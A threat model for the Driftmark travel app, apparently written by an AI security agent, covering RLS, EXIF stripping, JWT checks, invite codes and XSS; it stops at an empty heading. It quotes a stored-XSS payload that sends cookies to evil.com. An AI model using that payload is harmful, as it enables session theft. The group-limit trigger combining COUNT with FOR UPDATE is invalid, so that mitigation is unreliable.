# Driftmark — Threat Model

**Version**: 1.0
**Date**: 2026-03-24
**Author**: Security Agent
**Status**: ACTIVE — All agents must read and implement the mitigations herein before writing code.

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Attack Surface Inventory](#2-attack-surface-inventory)
3. [Threat Analysis](#3-threat-analysis)
   - [AS-01 Authentication & Session Management](#as-01-authentication--session-management)
   - [AS-02 Database Access & RLS Policies](#as-02-database-access--rls-policies)
   - [AS-03 File Uploads & Photo Security](#as-03-file-uploads--photo-security)
   - [AS-04 Realtime Channels](#as-04-realtime-channels)
   - [AS-05 Group Invite System](#as-05-group-invite-system)
   - [AS-06 User-Generated Content](#as-06-user-generated-content)
   - [AS-07 API Endpoints & Edge Functions](#as-07-api-endpoints--edge-functions)
   - [AS-08 Client-Side Data Storage](#as-08-client-side-data-storage)
   - [AS-09 Push Notifications](#as-09-push-notifications)
   - [AS-10 Sharing Features & Deep Links](#as-10-sharing-features--deep-links)
   - [AS-11 Rate Limiting & Abuse Prevention](#as-11-rate-limiting--abuse-prevention)
   - [AS-12 GDPR & Data Privacy](#as-12-gdpr--data-privacy)
   - [AS-13 Web-Specific Risks](#as-13-web-specific-risks)
   - [AS-14 Mobile-Specific Risks](#as-14-mobile-specific-risks)
4. [Security Constraints](#4-security-constraints)
5. [Testing Requirements](#5-testing-requirements)

---

## 1. Executive Summary

The following five threats represent the highest risk to Driftmark users and the application. Every other agent must treat these as blockers — no feature that touches these areas ships without the corresponding mitigations implemented and tested.

### TOP-1 — Broken Object-Level Authorization via Missing or Incorrect RLS (Critical)

**Scenario**: A user queries `visited_places`, `place_ratings`, or `place_photos` directly through the Supabase REST/PostgREST API using the public anon key. Without RLS policies that enforce `auth.uid() = user_id`, any authenticated user can read or modify another user's travel data, ratings, and private photos.

**Why it is Critical**: The core privacy promise of Driftmark is that your travel journal is yours. A single missing `USING` clause in one RLS policy invalidates that promise for every user in the database. The Supabase anon key is embedded in the client bundle and is therefore public — RLS is the only real authorization boundary.

**Owner**: Security Agent (policy authoring), Backend Agent (must verify every query respects RLS).

---

### TOP-2 — Photo EXIF Metadata Leaks Precise GPS Location (Critical)

**Scenario**: A user uploads a photo taken on a smartphone. The JPEG EXIF block contains `GPSLatitude`, `GPSLongitude`, `GPSAltitude`, and `DateTimeOriginal`. Supabase Storage serves these files without stripping metadata. Any user with a link (or any future public share feature) can extract the exact coordinates of the user's home, hotel, or route.

**Why it is Critical**: This is a real-world physical safety risk, not an abstract data-leak. EXIF leaks have been weaponized to stalk and harm people. It cannot be mitigated by policy alone — the bytes must be removed before the file leaves the device.

**Owner**: Security Agent (client-side stripping library in `src/lib/photoSecurity.ts`), Backend Agent (server-side re-validation in the upload Edge Function).

---

### TOP-3 — JWT Validation Absent on Edge Functions Exposes All Server-Side Logic (Critical)

**Scenario**: A Supabase Edge Function that sends push notifications, triggers achievement checks, or handles group operations does not verify the `Authorization: Bearer <jwt>` header. An unauthenticated caller can invoke it directly with crafted payloads, causing data corruption, notification spam, or achievement manipulation.

**Why it is Critical**: Edge Functions execute with the Supabase service-role key, bypassing RLS entirely. An unvalidated Edge Function is effectively a backdoor into the database.

**Owner**: Security Agent (JWT validation middleware in `src/lib/auth.ts`), Backend Agent (must import and apply to every function).

---

### TOP-4 — Group Invite Code Enumeration & Replay (High)

**Scenario**: Group invite codes stored as short random strings (e.g. 8 hex chars) in the `groups` table are guessable via brute-force enumeration (16^8 = ~4 billion combinations, tractable with no rate limit). Additionally, an expired or already-used code that is not invalidated in the database can be replayed to join a group.

**Why it is High**: Group membership grants access to all members' travel data, real-time location-adjacent information, and joint rating views. An attacker joining a group silently can harvest private trip plans and personal ratings.

**Owner**: Security Agent (invite code design and expiry logic), Backend Agent (join flow), DevOps Agent (rate limiting on join endpoint).

---

### TOP-5 — Stored XSS via User-Generated Content Rendered Without Sanitization (High)

**Scenario**: A user enters `<script>alert(document.cookie)</script>` or an `<img src=x onerror=...>` payload in a review, display name, or photo caption. The text is stored as-is and later rendered in a React Native WebView or on the React web build without HTML escaping. On web, this executes arbitrary JavaScript in the victim's browser session, enabling session token theft or account takeover.

**Why it is High**: React Native's native text components are XSS-immune by default, but the web build and any future WebView usage are fully vulnerable. Because user-generated content is shared across group members, one attacker can target all 3 other group members simultaneously.

**Owner**: Security Agent (Zod schemas + `src/lib/sanitize.ts`), UI Agent (must never use `dangerouslySetInnerHTML` without DOMPurify), Backend Agent (sanitize before DB write).

---

## 2. Attack Surface Inventory

| ID | Attack Surface | Risk Level | Rationale |
|---|---|---|---|
| AS-01 | Authentication & Session Management | **Critical** | Google OAuth misconfiguration or token theft enables full account takeover |
| AS-02 | Database Access & RLS Policies | **Critical** | Missing RLS exposes all user data to any authenticated requester |
| AS-03 | File Uploads & Photo Security | **Critical** | EXIF GPS leaks are a physical safety risk; malicious files can corrupt storage |
| AS-04 | Realtime Channels | **Medium** | Subscription authorization bypass lets users spy on other groups' live updates |
| AS-05 | Group Invite System | **High** | Enumerable invite codes allow unauthorized group access |
| AS-06 | User-Generated Content | **High** | Stored XSS via reviews/names on web; injection into DB if unvalidated |
| AS-07 | API Endpoints / Edge Functions | **Critical** | Unvalidated JWTs on Edge Functions bypass all RLS |
| AS-08 | Client-Side Data Storage | **Medium** | Offline queue in AsyncStorage can expose sensitive data on shared/rooted devices |
| AS-09 | Push Notifications | **Medium** | Token theft enables notification spoofing; content leaks private trip data |
| AS-10 | Sharing Features & Deep Links | **Medium** | Deep link hijacking on Android; open redirect via share card URLs |
| AS-11 | Rate Limiting & Abuse Prevention | **High** | Unbounded writes enable storage cost abuse and data flooding |
| AS-12 | GDPR / Data Privacy | **High** | Incomplete deletion leaves orphaned personal data; no export violates regulation |
| AS-13 | Web-Specific Risks | **High** | Missing CSP/HSTS allows clickjacking, MITM, and XSS escalation |
| AS-14 | Mobile-Specific Risks | **Medium** | Deep link hijacking, lack of secure storage, debug builds leaking secrets |

---

## 3. Threat Analysis

---

### AS-01 Authentication & Session Management

#### Threat Scenarios

**T-01-A: OAuth State Parameter Forgery (CSRF on OAuth flow)**
An attacker tricks a victim into initiating an OAuth flow with the attacker's `state` parameter. When the victim completes authentication, the code is exchanged with the attacker's session, binding the victim's Google account to the attacker's session. Supabase Auth handles the state parameter internally, but any custom OAuth redirect handling in the app could re-introduce this.

**T-01-B: JWT Token Leakage via Log Output**
Access tokens logged to the console in development builds are inadvertently shipped in production builds or captured by crash reporting tools.

**T-01-C: Session Persistence After Account Compromise**
A user's Google account is compromised. The attacker changes the Google password, but the Supabase JWT remains valid for its full lifespan (default 1 hour), and the Supabase refresh token remains valid for 30 days. The victim cannot invalidate existing sessions.

**T-01-D: Insecure Token Storage on Web**
Supabase's default JS client stores the session in `localStorage` on web. Any XSS payload can read `localStorage` and exfiltrate the complete JWT and refresh token.

**T-01-E: Token Refresh Race Condition**
Concurrent tab/window refreshes on web both attempt to refresh the token simultaneously, potentially causing one to use an already-revoked refresh token, logging the user out unexpectedly or creating a stale token state.

| Metric | Value |
|---|---|
| Likelihood | 3 |
| Impact | 5 |
| Risk Score | **15** |

#### Mitigations

**M-01-A** (Security Agent — `src/lib/auth.ts`): Use Supabase's built-in OAuth flow exclusively. Never implement a custom OAuth redirect handler. Call `supabase.auth.signInWithOAuth({ provider: 'google', options: { redirectTo: process.env.EXPO_PUBLIC_OAUTH_REDIRECT } })` only. Do not read or write the `state` parameter manually.

**M-01-B** (Security Agent + DevOps Agent): Strip all token values from log output. Create a `logger.ts` wrapper that replaces any string matching `eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+` with `[REDACTED_JWT]` before writing to console. Configure Sentry/crash tools to scrub the `Authorization` header and `access_token` fields from all payloads.

**M-01-C** (Security Agent — `src/lib/auth.ts`): Implement a global sign-out function that calls `supabase.auth.signOut()` which revokes the refresh token server-side. Add a "Sign out all devices" option in settings. Set the Supabase Auth session timeout to 30 days of inactivity by configuring `AUTH_JWT_EXPIRY` in the Supabase project settings to `3600` (1 hour) and refresh token expiry to `2592000` (30 days). Document that users must use "Sign out all devices" after a Google account compromise.

**M-01-D** (Security Agent — `src/lib/supabase.ts`): Configure the Supabase client to use `localStorage: false` on web and instead use the `storage` option pointing to a custom implementation backed by `sessionStorage` (tab-scoped, cleared on tab close) for non-persistent sessions, or a `httpOnly` cookie adapter if SSR is used. Preferred implementation:
```typescript
import { createClient } from '@supabase/supabase-js';
// On web: use sessionStorage to limit XSS blast radius
const storage = typeof window !== 'undefined' ? window.sessionStorage : undefined;
export const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  auth: { storage, persistSession: true, autoRefreshToken: true, detectSessionInUrl: true }
});
```
On native: Supabase JS client uses `AsyncStorage` by default — override with `expo-secure-store` adapter (see AS-08).

**M-01-E** (Backend Agent — `src/lib/supabase.ts`): Set `autoRefreshToken: true` in the Supabase client. Supabase handles token refresh locking internally via a mutex — do not implement custom refresh logic. Test with multiple concurrent tabs on web to verify no double-refresh errors appear.

---

### AS-02 Database Access & RLS Policies

#### Threat Scenarios

**T-02-A: Horizontal Privilege Escalation on `visited_places`**
User A calls `supabase.from('visited_places').select(...)` without a `.eq('user_id', userId)` filter. If RLS is disabled or misconfigured, they receive all rows from all users.

**T-02-B: Group Data Leakage**
User A is not a member of Group B but queries `group_places` or subscribes to the group's Realtime channel and receives real-time location updates from Group B members.

**T-02-C: `cities` Table Pollution**
A user inserts or updates rows in the `cities` reference table, injecting fake cities that corrupt the world map for all users.

**T-02-D: Achievement Manipulation**
A user directly inserts a row into the `achievements` table to award themselves badges they have not earned.

**T-02-E: Profile Enumeration**
A user enumerates all profiles (display names, avatar URLs) by scanning `profiles` with a sequential `id` query, harvesting user identity information.

**T-02-F: RPC Function Privilege Escalation**
A database function defined with `SECURITY DEFINER` runs as the table owner (superuser), bypassing RLS. If the function accepts user-controlled parameters without validation, it becomes a privilege escalation vector.

| Metric | Value |
|---|---|
| Likelihood | 4 |
| Impact | 5 |
| Risk Score | **20** |

#### Mitigations

**M-02-A** (Security Agent — `supabase/migrations/XXX_rls_policies.sql`): Enable RLS on every user-data table. Write explicit policies. Template for `visited_places`:
```sql
ALTER TABLE visited_places ENABLE ROW LEVEL SECURITY;

CREATE POLICY "visited_places_select_own"
  ON visited_places FOR SELECT
  USING (auth.uid() = user_id);

CREATE POLICY "visited_places_insert_own"
  ON visited_places FOR INSERT
  WITH CHECK (auth.uid() = user_id);

CREATE POLICY "visited_places_update_own"
  ON visited_places FOR UPDATE
  USING (auth.uid() = user_id)
  WITH CHECK (auth.uid() = user_id);

CREATE POLICY "visited_places_delete_own"
  ON visited_places FOR DELETE
  USING (auth.uid() = user_id);
```
Apply equivalent policies to `place_ratings` (via FK ownership check), `place_photos`, `push_tokens`, `profiles`.

**M-02-B** (Security Agent): For group tables, RLS must verify group membership:
```sql
CREATE POLICY "group_places_select_members_only"
  ON group_places FOR SELECT
  USING (
    EXISTS (
      SELECT 1 FROM group_members
      WHERE group_members.group_id = group_places.group_id
        AND group_members.user_id = auth.uid()
    )
  );
```
Apply equivalent logic to `groups` (read: member only; write: creator only) and `group_members`.

**M-02-C** (Security Agent): `cities` is a read-only reference table. Apply:
```sql
ALTER TABLE cities ENABLE ROW LEVEL SECURITY;
CREATE POLICY "cities_readonly" ON cities FOR SELECT USING (true);
-- No INSERT, UPDATE, DELETE policies — anon and authenticated users cannot write.
```
Verify in a test that `INSERT INTO cities` returns a permission error for any JWT.

**M-02-D** (Security Agent): `achievements` must only be writable by database functions (not users):
```sql
ALTER TABLE achievements ENABLE ROW LEVEL SECURITY;
CREATE POLICY "achievements_select_own" ON achievements FOR SELECT USING (auth.uid() = user_id);
-- INSERT/UPDATE/DELETE: no user-facing policy. Only SECURITY DEFINER functions can write.
```

**M-02-E** (Security Agent): `profiles` is publicly readable but self-editable only:
```sql
CREATE POLICY "profiles_select_public" ON profiles FOR SELECT USING (true);
CREATE POLICY "profiles_update_own" ON profiles FOR UPDATE
  USING (auth.uid() = id) WITH CHECK (auth.uid() = id);
```
Note: publicly readable profiles intentionally do not include sensitive fields. Ensure `push_tokens` and `google_id` are NOT in the `profiles` table — keep them in separate restricted tables.

**M-02-F** (Security Agent + Backend Agent): All RPC functions that accept user-supplied parameters must use `SECURITY INVOKER` (not `SECURITY DEFINER`) unless they specifically require elevated access (e.g., `check_achievements`). For `SECURITY DEFINER` functions, validate all input parameters against expected types and ranges at the top of the function body before any DML. Example:
```sql
CREATE OR REPLACE FUNCTION check_achievements(p_user_id UUID)
RETURNS VOID
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  -- Verify the caller IS the user being checked (prevents checking others' achievements)
  IF auth.uid() != p_user_id THEN
    RAISE EXCEPTION 'unauthorized';
  END IF;
  -- ... achievement logic
END;
$$;
```

---

### AS-03 File Uploads & Photo Security

#### Threat Scenarios

**T-03-A: EXIF GPS Metadata Exposes Physical Location**
Photos uploaded from a smartphone embed GPS coordinates, altitude, device model, and timestamp in the EXIF block. This data is served verbatim by Supabase Storage.

**T-03-B: Malicious File Type Disguised as Image**
An attacker uploads a PHP/HTML/SVG file with a `.jpg` extension and a crafted `Content-Type: image/jpeg` header. If the server only checks the MIME type header, the malicious file is stored and later served with its original content.

**T-03-C: SVG-Based XSS**
SVG files are valid XML and can contain `<script>` tags. An SVG uploaded as a profile photo or place image, when served by Supabase Storage with `Content-Type: image/svg+xml`, executes JavaScript when opened directly in a browser tab.

**T-03-D: Storage Quota Abuse**
A user uploads thousands of large files to inflate storage costs. Without server-side size limits, a single user can upload until the Supabase storage quota is exhausted.

**T-03-E: Path Traversal in Storage Keys**
If the client constructs the storage path using user-supplied data (e.g., `${userId}/${filename}`), a malicious filename like `../../other-user-id/secret.jpg` could overwrite another user's file.

**T-03-F: Thumbnail Generation Bypass**
A user accesses the original full-resolution image via a direct storage URL, bypassing the thumbnail path and retrieving a higher-resolution version that may contain more detail or residual metadata.

| Metric | Value |
|---|---|
| Likelihood | 4 |
| Impact | 4 |
| Risk Score | **16** |

#### Mitigations

**M-03-A** (Security Agent — `src/lib/photoSecurity.ts`): Strip EXIF client-side before upload using `piexifjs` or `exifr`. The stripping must happen before the file is passed to any Supabase Storage upload call. Implementation pattern:
```typescript
import Exifr from 'exifr';
import { manipulateAsync, SaveFormat } from 'expo-image-manipulator';

export async function stripExifAndCompress(uri: string): Promise<string> {
  // Re-encode through expo-image-manipulator — this drops EXIF by default
  const result = await manipulateAsync(uri, [], {
    compress: 0.8,
    format: SaveFormat.JPEG,
  });
  // Verify no GPS data remains
  const remaining = await Exifr.parse(result.uri, ['GPSLatitude', 'GPSLongitude']);
  if (remaining?.GPSLatitude || remaining?.GPSLongitude) {
    throw new Error('EXIF stripping failed — upload blocked');
  }
  return result.uri;
}
```
On web, use `canvas.toBlob()` to re-encode, which drops EXIF entirely. Never use the raw file URI from the image picker.

**M-03-B** (Security Agent — `src/lib/photoSecurity.ts`): Validate file type by checking magic bytes (file signature), not just MIME type or extension. Allowed signatures:
- JPEG: `FF D8 FF`
- PNG: `89 50 4E 47 0D 0A 1A 0A`
- WebP: bytes 8-11 must be `57 45 42 50`

```typescript
export async function validateImageMagicBytes(file: Blob): Promise<void> {
  const buffer = await file.slice(0, 12).arrayBuffer();
  const bytes = new Uint8Array(buffer);
  const isJPEG = bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF;
  const isPNG = bytes[0] === 0x89 && bytes[1] === 0x50 && bytes[2] === 0x4E && bytes[3] === 0x47;
  const isWebP = bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50;
  if (!isJPEG && !isPNG && !isWebP) {
    throw new Error('Invalid file type — only JPEG, PNG, and WebP are allowed');
  }
}
```

**M-03-C** (Security Agent + DevOps Agent): SVG must never be accepted. The `validateImageMagicBytes` function rejects SVG at the byte level. Additionally, configure the Supabase Storage `place-photos` bucket to only accept `image/jpeg`, `image/png`, and `image/webp` MIME types via bucket policy.

**M-03-D** (Security Agent + DevOps Agent): Enforce a 5MB client-side size check before calling the EXIF stripper (to prevent OOM). After compression, the upload must be <1MB. On the Supabase Storage side, configure the bucket's `file_size_limit` to `5242880` (5MB) via the Supabase dashboard or migration. The Edge Function upload handler must also enforce the 1MB post-compression limit server-side.

**M-03-E** (Security Agent — `src/lib/photoSecurity.ts`): Construct storage paths server-side only. The path must be `{auth.uid()}/{uuid4()}.{ext}` where `uuid4()` is generated server-side in the Edge Function. Never pass a user-supplied filename. Validate in the RLS storage policy:
```sql
CREATE POLICY "place_photos_upload_own_path"
  ON storage.objects FOR INSERT
  WITH CHECK (
    bucket_id = 'place-photos'
    AND (storage.foldername(name))[1] = auth.uid()::text
  );
```

**M-03-F** (Security Agent + Backend Agent): The `place_photos` table stores both `storage_path` (original) and `thumbnail_path`. The app must ALWAYS use `thumbnail_path` for display. The `storage_path` (original) should only be accessible via a signed URL with a short TTL (300 seconds) generated server-side when the user explicitly requests full-resolution. Never expose public URLs for original images.

---

### AS-04 Realtime Channels

#### Threat Scenarios

**T-04-A: Unauthorized Subscription to Group Channel**
A user subscribes to `supabase.channel('group:<group_id>')` without being a member of that group. Supabase Realtime does not enforce RLS on channel subscriptions by default — only the underlying SELECT query through `postgres_changes` respects RLS.

**T-04-B: Channel Name Enumeration**
Group channel names are predictable (e.g., `group:${groupId}`). An attacker who knows or guesses a group UUID can subscribe to the channel and receive real-time updates.

**T-04-C: Message Injection via Broadcast**
If the app uses Supabase Realtime `broadcast` for client-to-server messages (not just `postgres_changes`), any subscriber to the same channel can inject arbitrary broadcast events. Other clients that trust broadcast message payloads without re-validating against the database can be fed false data.

**T-04-D: Subscription Leak from Unclean Component Unmount**
A component unmounts (user navigates away) without calling `channel.unsubscribe()`. The channel remains open, continuing to receive data and potentially causing memory leaks or stale state application.

| Metric | Value |
|---|---|
| Likelihood | 3 |
| Impact | 3 |
| Risk Score | **9** |

#### Mitigations

**M-04-A** (Security Agent + Backend Agent — `src/services/groups.ts`): Use `postgres_changes` (not broadcast) for all group data sync. `postgres_changes` events are filtered by RLS — if the subscribing user cannot SELECT the row, they do not receive the change event. Never use broadcast for sensitive data.
```typescript
supabase
  .channel(`group-${groupId}`)
  .on('postgres_changes', {
    event: '*',
    schema: 'public',
    table: 'group_places',
    filter: `group_id=eq.${groupId}`,
  }, handleGroupUpdate)
  .subscribe();
```

**M-04-B** (Backend Agent — `src/services/groups.ts`): Before subscribing to a group channel, verify membership via a database query:
```typescript
const { data: membership } = await supabase
  .from('group_members')
  .select('id')
  .eq('group_id', groupId)
  .eq('user_id', session.user.id)
  .single();
if (!membership) throw new Error('Not a group member');
// Only then subscribe
```

**M-04-C** (Backend Agent): Never use Realtime broadcast for data that originates server-side. All state mutations go through Supabase mutations (INSERT/UPDATE/DELETE) which are propagated via `postgres_changes`. Broadcast may only be used for ephemeral UI events (e.g., "user is typing") and the payload must never be trusted as ground truth — always re-fetch from the DB on receipt.

**M-04-D** (Backend Agent + UI Agent): Every `useEffect` that creates a Realtime subscription must return a cleanup function that calls `.unsubscribe()` and `supabase.removeChannel(channel)`. Use a single channel per group (as specified in the architecture). Add a lint rule via ESLint custom plugin to warn on any `supabase.channel(` call that is not immediately followed by cleanup in the same `useEffect`.

---

### AS-05 Group Invite System

#### Threat Scenarios

**T-05-A: Brute-Force Invite Code Enumeration**
If invite codes are 8 alphanumeric characters, the keyspace is 36^8 ≈ 2.8 trillion. With no rate limiting and no lockout, an attacker can enumerate codes at scale using the Supabase REST API directly.

**T-05-B: Invite Code Replay After Expiry**
An expired invite code that is not deleted or invalidated in the database can still be submitted. If the application checks expiry only on the client, a raw API call bypasses the check.

**T-05-C: Invite Code Forwarding / Unintended Sharing**
A group member shares the invite link publicly (social media, screenshot). Anyone with the link joins the group before the 7-day window closes.

**T-05-D: Race Condition on Group Limit Enforcement**
Two users submit the same invite code simultaneously. Both pass the "group has < 4 members" check at the application layer. Both are inserted, creating a 5-member group.

**T-05-E: Invite Code Disclosure in URL Parameters**
The deep link `driftmark://group/join/<code>` appears in server logs, browser history, and referrer headers. If logs are accessible to third parties, invite codes leak.

| Metric | Value |
|---|---|
| Likelihood | 3 |
| Impact | 4 |
| Risk Score | **12** |

#### Mitigations

**M-05-A** (Security Agent — `supabase/migrations/`): Generate invite codes using `gen_random_bytes(16)` and encode as base64url (not hex). This gives 128 bits of entropy — effectively brute-force-resistant regardless of rate limiting. Store the code hashed (`SHA-256`) in the database; compare the hash on lookup:
```sql
-- On invite code generation (Edge Function):
SELECT encode(gen_random_bytes(16), 'base64') AS raw_code;
-- Store: encode(digest(raw_code, 'sha256'), 'hex')
-- Lookup: WHERE invite_code_hash = encode(digest($1, 'sha256'), 'hex')
```
The raw code is only returned once at creation time and never stored in plaintext.

**M-05-B** (Security Agent — RLS + Edge Function): Enforce expiry server-side in the join Edge Function:
```typescript
const { data: group } = await supabaseAdmin
  .from('groups')
  .select('id, invite_expires_at')
  .eq('invite_code_hash', hashCode(inviteCode))
  .single();
if (!group || new Date(group.invite_expires_at) < new Date()) {
  return new Response('Invite code expired or invalid', { status: 410 });
}
```
Never perform this check on the client. Delete or null the `invite_code_hash` column after a join or after expiry.

**M-05-C** (Security Agent + Backend Agent): Add a per-group "revoke invite" function that regenerates the code. Default 7-day expiry is acceptable. Add UI affordance for the group creator to revoke and regenerate. Do not implement "multi-use" invites — each code is single-use: after one person joins, invalidate the old code and optionally generate a new one.

**M-05-D** (Security Agent — `supabase/migrations/`): Enforce the 4-member limit atomically at the database level using a trigger:
```sql
CREATE OR REPLACE FUNCTION enforce_group_member_limit()
RETURNS TRIGGER LANGUAGE plpgsql AS $$
BEGIN
  IF (SELECT COUNT(*) FROM group_members WHERE group_id = NEW.group_id FOR UPDATE) >= 4 THEN
    RAISE EXCEPTION 'Group is full (max 4 members)';
  END IF;
  RETURN NEW;
END;
$$;

CREATE TRIGGER check_group_member_limit
  BEFORE INSERT ON group_members
  FOR EACH ROW EXECUTE FUNCTION enforce_group_member_limit();
```
The `FOR UPDATE` lock prevents the race condition.

**M-05-E** (DevOps Agent + UI Agent): The invite deep link must pass the code as a path segment, not a query parameter, to minimize logging exposure: `driftmark://group/join/<code>`. Ensure Vercel/server access logs redact path segments matching the invite code pattern (16+ char base64url strings). On web, use `history.replaceState` after reading the invite code from the URL to remove it from browser history.

---

### AS-06 User-Generated Content

#### Threat Scenarios

**T-06-A: Stored XSS in Reviews Rendered on Web**
A user submits a review containing `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`. This is stored in the database and rendered via `dangerouslySetInnerHTML` or an unescaped template in the web build.

**T-06-B: Stored XSS via Display Name**
Display names are rendered in group views for all 4 members. A malicious display name with embedded script can target all group members simultaneously.

**T-06-C: SQL/NoSQL Injection via Review Text**
Although Supabase uses parameterized queries by default through the JS client, a hand-written RPC function or Edge Function that string-interpolates user input into SQL is vulnerable to injection.

**T-06-D: Unicode/Homograph Attacks in Display Names**
A user registers with a display name using Cyrillic characters that look identical to Latin characters (e.g., `аdmin` where `а` is U+0430). This can be used for social engineering within groups or to impersonate the app's system messages.

**T-06-E: Extremely Long Inputs Causing DoS**
A user submits a 10MB review text. Without server-side length enforcement, this bloats the database row, slows queries, and increases storage costs.

| Metric | Value |
|---|---|
| Likelihood | 3 |
| Impact | 4 |
| Risk Score | **12** |

#### Mitigations

**M-06-A** (Security Agent — `src/lib/sanitize.ts`): All user-generated text must be sanitized with DOMPurify before storage AND before render on web. Install `dompurify` and `@types/dompurify`. Implementation:
```typescript
import DOMPurify from 'dompurify';

// Strip all HTML tags but preserve plain text
export function sanitizeText(input: string): string {
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: [], ALLOWED_ATTR: [] });
}

// For rich text if ever needed — extremely restrictive allowlist
export function sanitizeRichText(input: string): string {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: [],
  });
}
```
On React Native (native renderer), DOMPurify is not available. Use `sanitizeText` which strips all tags — safe because native Text components do not parse HTML.

**M-06-B** (UI Agent): NEVER use `dangerouslySetInnerHTML` anywhere in the codebase. Add an ESLint rule: `react/no-danger: 'error'`. The only exception is if DOMPurify output is explicitly wrapped, documented, and reviewed by the Security Agent.

**M-06-C** (Security Agent — `src/lib/validation.ts`): Zod schemas enforce length limits at the input layer (before any DB call):
```typescript
import { z } from 'zod';

export const ReviewSchema = z.string()
  .min(1, 'Review cannot be empty')
  .max(2000, 'Review must be 2000 characters or fewer')
  .transform(sanitizeText);

export const DisplayNameSchema = z.string()
  .min(1).max(30)
  .regex(/^[\p{L}\p{N}\s._-]+$/u, 'Display name contains invalid characters')
  .transform(sanitizeText);

export const CaptionSchema = z.string().max(500).transform(sanitizeText);
export const GroupNameSchema = z.string().min(1).max(50).transform(sanitizeText);
```

**M-06-D** (Security Agent — `src/lib/validation.ts`): Add a Unicode confusable check for display names. Use the `unicode-confusables` library or implement a denylist of mixed-script patterns:
```typescript
export const DisplayNameSchema = z.string()
  .min(1).max(30)
  .refine(name => {
    // Reject names that mix Latin and visually similar non-Latin scripts
    const hasLatin = /[a-zA-Z]/.test(name);
    const hasCyrillic = /[\u0400-\u04FF]/.test(name);
    const hasGreek = /[\u0370-\u03FF]/.test(name);
    return !(hasLatin && (hasCyrillic || hasGreek));
  }, 'Display name contains mixed scripts');
```

**M-06-E** (Security Agent + Backend Agent): Database column constraints enforce the final length limits as a last line of defense:
```sql
ALTER TABLE visited_places
  ADD CONSTRAINT review_max_length CHECK (char_length(review) <= 2000);
ALTER TABLE profiles
  ADD CONSTRAINT display_name_max_length CHECK (char_length(display_name) <= 30);
ALTER TABLE place_photos
  ADD CONSTRAINT caption_max_length CHECK (char_length(caption) <= 500);
```

---

### AS-07 API Endpoints & Edge Functions

#### Threat Scenarios

**T-07-A: Unauthenticated Edge Function Invocation**
An Edge Function (`send-push-notification`, `rate-limit`, etc.) is invoked without a valid JWT. The function processes the request and executes privileged operations using the service-role key.

**T-07-B: JWT Algorithm Confusion (None Algorithm)**
A crafted JWT with `"alg": "none"` is submitted. A naive JWT verification that does not explicitly require `RS256`/`HS256` accepts the unsigned token.

**T-07-C: Expired JWT Accepted**
An Edge Function validates the JWT signature but does not check the `exp` claim, accepting tokens that were valid hours or days ago.

**T-07-D: IDOR via Manipulated Request Body**
An authenticated user submits a valid JWT but with a request body that references another user's resource ID (e.g., `{ visitedPlaceId: 'other_user_place_id' }`). The Edge Function uses the service-role client and executes the operation without checking ownership.

**T-07-E: CORS Misconfiguration**
Edge Functions return `Access-Control-Allow-Origin: *`, allowing any website to make credentialed requests to the API.

| Metric | Value |
|---|---|
| Likelihood | 4 |
| Impact | 5 |
| Risk Score | **20** |

#### Mitigations

**M-07-A** (Security Agent — `src/lib/auth.ts`): Create a reusable JWT validation middleware for all Edge Functions:
```typescript
// supabase/functions/_shared/auth.ts
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

export async function requireAuth(req: Request): Promise<{ userId: string; client: SupabaseClient }> {
  const authHeader = req.headers.get('Authorization');
  if (!authHeader?.startsWith('Bearer ')) {
    throw new Response('Missing authorization header', { status: 401 });
  }
  const token = authHeader.slice(7);
  // Create a user-scoped client (NOT service role) — this respects RLS
  const client = createClient(
    Deno.env.get('SUPABASE_URL')!,
    Deno.env.get('SUPABASE_ANON_KEY')!,
    { global: { headers: { Authorization: `Bearer ${token}` } } }
  );
  const { data: { user }, error } = await client.auth.getUser();
  if (error || !user) {
    throw new Response('Invalid or expired token', { status: 401 });
  }
  return { userId: user.id, client };
}
```
Every Edge Function must call `requireAuth(req)` as its first operation. Any function that does not call `requireAuth` must have an explicit comment `// PUBLIC_ENDPOINT: no auth required` approved by the Security Agent.

**M-07-B** (Security Agent): Use `supabase.auth.getUser(token)` (not `jwt.verify()`) for token validation. Supabase's Auth server validates the algorithm, signature, issuer, and expiry atomically. Never implement manual JWT parsing in Edge Functions.

**M-07-C**: Covered by M-07-B — `getUser()` validates the `exp` claim server-side.

**M-07-D** (Security Agent + Backend Agent): After JWT validation, all resource lookups in Edge Functions must use the user-scoped Supabase client (from M-07-A), never the service-role client, for operations on user-owned data. The service-role client is only used for operations that must bypass RLS (e.g., inserting achievement records, sending push notifications to other users). Any service-role operation must explicitly verify ownership of the referenced resource before proceeding:
```typescript
// WRONG: service role client reads place without ownership check
const { data } = await adminClient.from('visited_places').select().eq('id', body.placeId);

// CORRECT: use user-scoped client — RLS enforces ownership
const { data } = await userClient.from('visited_places').select().eq('id', body.placeId);
if (!data) return new Response('Not found or unauthorized', { status: 404 });
```

**M-07-E** (DevOps Agent + Security Agent): Configure CORS in every Edge Function to allow only the app's domain:
```typescript
const ALLOWED_ORIGINS = [
  'https://driftmark.app',
  'https://www.driftmark.app',
  // Dev only — strip in production:
  ...(Deno.env.get('ENVIRONMENT') === 'development' ? ['http://localhost:8081'] : []),
];

function corsHeaders(req: Request): HeadersInit {
  const origin = req.headers.get('Origin') ?? '';
  const allowed = ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0];
  return {
    'Access-Control-Allow-Origin': allowed,
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Authorization, Content-Type',
    'Vary': 'Origin',
  };
}
```

---

### AS-08 Client-Side Data Storage

#### Threat Scenarios

**T-08-A: JWT Stored in Plaintext AsyncStorage**
Expo's `AsyncStorage` is unencrypted on Android. On a rooted Android device or via a physical device compromise, an attacker reads the AsyncStorage database and extracts the Supabase JWT and refresh token.

**T-08-B: Offline Queue Exposes Sensitive Operations**
